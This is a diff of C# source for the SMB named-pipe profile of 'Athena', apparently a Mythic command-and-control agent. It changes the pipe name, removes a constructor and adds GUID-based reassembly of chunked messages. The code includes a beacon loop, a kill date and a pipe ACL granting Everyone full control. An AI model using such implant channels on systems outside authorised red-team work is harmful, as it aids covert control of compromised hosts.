@@ -6,19 +6,15 @@ using Athena.Models.Mythic.Response;
 using Athena.Models.Mythic.Tasks;
 using Athena.Utilities;
 using System.Collections.Concurrent;
-
 using H.Pipes;
 using H.Pipes.Args;
 using H.Pipes.AccessControl;
-
 using System.Diagnostics;
 using System.IO.Pipes;
 using System.Security.AccessControl;
 using System.Security.Principal;
 using System.Text;
 using System.Text.Json;
-using Athena.Models;
-using H.Pipes.Extensions;
 using Athena.Models.Comms.SMB;
 
 namespace Athena
@@ -27,7 +23,7 @@ namespace Athena
     {
         public string uuid { get; set; }
         public string psk { get; set; }
-        public string pipeName = "scottie_pipe";
+        public string pipeName = "pipename";
         private string checkinResponse { get; set; }
         public DateTime killDate { get; set; }
         public int sleep { get; set; }
@@ -78,38 +74,6 @@ namespace Athena
 
             Debug.WriteLine($"[{DateTime.Now}] Started SMB Server. Listening on {this.pipeName}");
         }
-
-        public Smb(string uuid, string psk, string pipename)
-        {
-            this.uuid = uuid;
-            this.psk = psk;
-            this.pipeName= pipename;
-            this.connected = false;
-            this.sleep = 0;
-            this.jitter = 0; ;
-            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
-            this.killDate = kd;
-            if (!string.IsNullOrEmpty(this.psk))
-            {
-                this.crypt = new PSKCrypto(this.uuid, this.psk);
-                this.encrypted = true;
-            }
-            this.serverPipe = new PipeServer<SmbMessage>(this.pipeName);
-            if (Environment.OSVersion.Platform == PlatformID.Win32NT)
-            {
-#pragma warning disable CA1416
-                var pipeSec = new PipeSecurity();
-                pipeSec.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), PipeAccessRights.FullControl, AccessControlType.Allow));
-                this.serverPipe.SetPipeSecurity(pipeSec);
-#pragma warning restore CA1416
-            }
-            this.cancellationToken = this.cts.Token;
-            this.serverPipe.ClientConnected += async (o, args) => await OnClientConnection();
-            this.serverPipe.ClientDisconnected += async (o, args) => await OnClientDisconnect();
-            this.serverPipe.MessageReceived += (sender, args) => OnMessageReceive(args);
-            this.serverPipe.StartAsync(this.cancellationToken);
-
-        }
         public async Task StartBeacon()
         {
             Debug.WriteLine($"[{DateTime.Now}] Starting Beacon Loop.");
@@ -139,6 +103,7 @@ namespace Athena
                     };
 
                     //Just send the stuff, I don't really currently know how to error check sends.
+                    Debug.WriteLine($"[{DateTime.Now}] Sending regular get_tasking");
                     await this.Send(JsonSerializer.Serialize(gt, GetTaskingJsonContext.Default.GetTasking));
                 }
             }
@@ -222,14 +187,14 @@ namespace Athena
                     return;
                 }
 
-                this.partialMessages.TryAdd(args.Message.message_type, new StringBuilder()); //Either Add the key or it already exists
+                this.partialMessages.TryAdd(args.Message.guid, new StringBuilder()); //Either Add the key or it already exists
 
-                this.partialMessages[args.Message.message_type].Append(args.Message.delegate_message);
+                this.partialMessages[args.Message.guid].Append(args.Message.delegate_message);
 
                 if (args.Message.final)
                 {
-                    this.OnMythicMessageReceived(this.partialMessages[args.Message.message_type].ToString());
-                    this.partialMessages.Remove(args.Message.message_type, out _);
+                    this.OnMythicMessageReceived(this.partialMessages[args.Message.guid].ToString());
+                    this.partialMessages.TryRemove(args.Message.guid, out _);
                 }
 
                 await this.SendSuccess();
@@ -246,12 +211,6 @@ namespace Athena
             this.connected = true;
 
             await this.SendUpdate();
-
-            //if (this.checkedin)
-            //{
-            //    await this.SendUpdate();
-            //}
-            
         }
         private async Task OnClientDisconnect()
         {
@@ -284,6 +243,7 @@ namespace Athena
 
                 SmbMessage sm = new SmbMessage()
                 {
+                    guid = Guid.NewGuid().ToString(),
                     final = false,
                     message_type = "chunked_message"
                 };
@@ -315,11 +275,13 @@ namespace Athena
 
             return String.Empty;
         }
+
         private async Task SendSuccess()
         {
             //Indicate the server that we're done processing the message and it can send the next one (if it's there)
             SmbMessage sm = new SmbMessage()
             {
+                guid = Guid.NewGuid().ToString(),
                 message_type = "success",
                 final = true,
                 delegate_message = String.Empty
@@ -327,11 +289,11 @@ namespace Athena
 
             await this.serverPipe.WriteAsync(sm);
         }
-
         private async Task SendUpdate()
         {
             SmbMessage sm = new SmbMessage()
             {
+                guid = Guid.NewGuid().ToString(),
                 final = true,
                 message_type = "path_update",
                 delegate_message = this.uuid
